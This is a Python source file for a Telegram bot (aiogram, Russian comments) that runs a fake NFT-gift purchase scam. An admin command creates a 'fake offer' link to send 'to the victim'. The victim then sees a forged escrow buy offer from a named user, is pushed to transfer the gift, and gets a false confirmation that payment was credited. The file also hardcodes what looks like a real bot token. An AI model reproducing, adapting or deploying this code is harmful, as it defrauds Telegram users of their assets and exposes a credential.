# bot.py
import logging
import uuid
import sqlite3
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BotCommand

# --- КОНФИГ ---
BOT_TOKEN = "9033385840:AAG1xXCj-8cPl_u4DiImrpg5JXWFzE1UMu0"
ADMIN_ID = 7126242568

# --- БАЗА ДАННЫХ ---
conn = sqlite3.connect('offers.db')
cursor = conn.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS offers (
        token TEXT PRIMARY KEY,
        nft_link TEXT,
        currency TEXT,
        price REAL,
        lang TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')
conn.commit()

# --- БОТ И ДИСПЕТЧЕР ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class OfferForm(StatesGroup):
    nft_link = State()
    currency = State()
    price = State()
    lang = State()

async def set_commands(bot: Bot):
    commands = [
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="create", description="Создать фейк-оффер"),
    ]
    await bot.set_my_commands(commands)

@dp.message(Command("create"))
async def start_create(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("Скинь ссылку на NFT (например: https://t.me/nft/FaithAmulet-82365):")
    await state.set_state(OfferForm.nft_link)

@dp.message(OfferForm.nft_link)
async def process_nft_link(message: types.Message, state: FSMContext):
    await state.update_data(nft_link=message.text)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Stars", callback_data="cur_stars")],
        [InlineKeyboardButton(text="💎 TON", callback_data="cur_ton")],
        [InlineKeyboardButton(text="💎 Gram", callback_data="cur_gram")],
        [InlineKeyboardButton(text="💵 USDT", callback_data="cur_usdt")]
    ])
    await message.answer("Выбери валюту:", reply_markup=kb)
    await state.set_state(OfferForm.currency)

@dp.callback_query(OfferForm.currency)
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    # Названия валют для текста (иконки)
    currency_map = {
        "cur_stars": "⭐", 
        "cur_ton": "💎", 
        "cur_gram": "💎", 
        "cur_usdt": "💵"
    }
    cur_code = callback.data.replace("cur_", "")
    await state.update_data(currency=currency_map.get(callback.data, "💎"), currency_code=cur_code)
    await callback.message.edit_text("Введи цену (число, например: 7):")
    await state.set_state(OfferForm.price)

@dp.message(OfferForm.price)
async def process_price(message: types.Message, state: FSMContext):
    try:
        price = float(message.text)
    except ValueError:
        await message.answer("Введи число.")
        return
    await state.update_data(price=price)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="RU", callback_data="lang_ru")],
        [InlineKeyboardButton(text="EN", callback_data="lang_en")]
    ])
    await message.answer("Выбери язык оффера:", reply_markup=kb)
    await state.set_state(OfferForm.lang)

@dp.callback_query(OfferForm.lang)
async def process_lang(callback: types.CallbackQuery, state: FSMContext):
    lang_map = {"lang_ru": "RU", "lang_en": "EN"}
    await state.update_data(lang=lang_map.get(callback.data, "RU"))
    
    data = await state.get_data()
    token = uuid.uuid4().hex[:10]
    
    cursor.execute("INSERT INTO offers (token, nft_link, currency, price, lang) VALUES (?, ?, ?, ?, ?)",
                   (token, data['nft_link'], data['currency'], data['price'], data['lang']))
    conn.commit()
    
    fake_link = f"https://t.me/helperbabnikbot?start={token}"
    await callback.message.edit_text(f"Ссылка готова:\n\n{fake_link}\n\nКидай ее жертве.")
    await state.clear()

@dp.message(Command("start"))
async def handle_start(message: types.Message, state: FSMContext):
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Привет! Для начала сделки перейди по ссылке от продавца.")
        return
    
    token = args[1]
    cursor.execute("SELECT nft_link, currency, price, lang FROM offers WHERE token = ?", (token,))
    row = cursor.fetchone()
    
    if not row:
        await message.answer("Оффер не найден или истек.")
        return
    
    nft_link, currency, price, lang = row
    
    # 1. ОТПРАВЛЯЕМ САМУ ССЫЛКУ (TELEGRAM САМ РАЗВЕРНЕТ ЕЕ В КАРТИНКУ)
    try:
        await message.answer(nft_link)
    except Exception:
        pass # Игнорируем ошибку, если Telegram не смог подтянуть превью

    # 2. ОТПРАВЛЯЕМ ТЕКСТ С ЦЕНОЙ И КНОПКОЙ
    if lang == "RU":
        text = (
            f"🎁 Пользователь zvonok112\nпредлагает купить ваш подарок\n"
            f"FaithAmulet #82365 за {int(price)} {currency}.\n\n"
            f"Сумма будет зарезервирована на эскроу-счёте и зачислена на ваш баланс "
            f"после передачи подарка.\n\nПредложение действует ещё 21ч 26м."
        )
        transfer_btn = "Передать подарок"
    else:
        text = (
            f"🎁 User zvonok112\nwants to buy your gift\n"
            f"FaithAmulet #82365 for {int(price)} {currency}.\n\n"
            f"Amount is locked in escrow and will be credited after you transfer the gift.\n\n"
            f"Offer expires in 21h 26m."
        )
        transfer_btn = "Transfer Gift"
        
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=transfer_btn, callback_data=f"fake_transfer_{token}")]
    ])
    
    await message.answer(text, reply_markup=kb)

@dp.callback_query(F.data.startswith("fake_transfer_"))
async def process_fake_transfer(callback: types.CallbackQuery):
    token = callback.data.split("_")[2]
    cursor.execute("SELECT nft_link, price, currency FROM offers WHERE token = ?", (token,))
    row = cursor.fetchone()
    if not row:
        await callback.answer("Ошибка.")
        return
    
    nft_link, price, currency = row
    
    text = (
        f"✅ Сделка успешно завершена!\n\n"
        f"Вы передали подарок. {int(price)} {currency} зачислены на ваш баланс.\n"
        f"Спасибо за использование сервиса."
    )
    
    await callback.message.edit_text(text)
    await callback.answer("Сделка завершена.")

async def main():
    await set_commands(bot)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
